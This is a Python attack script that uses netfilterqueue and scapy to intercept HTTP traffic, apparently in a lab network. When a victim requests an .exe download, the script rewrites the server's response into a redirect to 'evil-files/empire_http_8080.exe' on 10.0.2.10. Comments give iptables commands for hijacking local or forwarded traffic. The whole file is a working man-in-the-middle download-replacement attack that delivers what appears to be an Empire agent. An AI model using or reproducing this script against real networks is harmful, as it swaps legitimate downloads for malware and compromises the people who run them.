#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
# import subprocess


"""
Before running this program, make sure to run,
iptables -I OUTPUT -j NFQUEUE -queue-num 0
iptables -I INPUT -j NFQUEUE -queue-num 0

If targeting a remote computer, use,
iptables -I FORWARD -j NFQUEUE -queue-num 0

When you're done make sure to flush iptables,
iptables --flush
"""


# print('[+] Setting iptables...')
# subprocess.call('iptables -I FORWARD -j NFQUEUE --queue-num 0', shell=True)
act_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if '.exe' in scapy_packet[scapy.Raw].load:
                print('[+] exe Request')
                act_list.append(scapy_packet[scapy.TCP].ack)

        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in act_list:
                act_list.remove(scapy_packet[scapy.TCP].seq)
                print('[+] Replacing file')
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.10/evil-files/empire_http_8080.exe\n\n")

                packet.set_payload(str(modified_packet))

    packet.accept()

# try:
#     subprocess.call('iptables --flush', shell=True)
#     while True:
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
# except KeyboardInterrupt:
#     print("[+] Detected CTRL + C ..... Restoring iptables \n")
#     subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
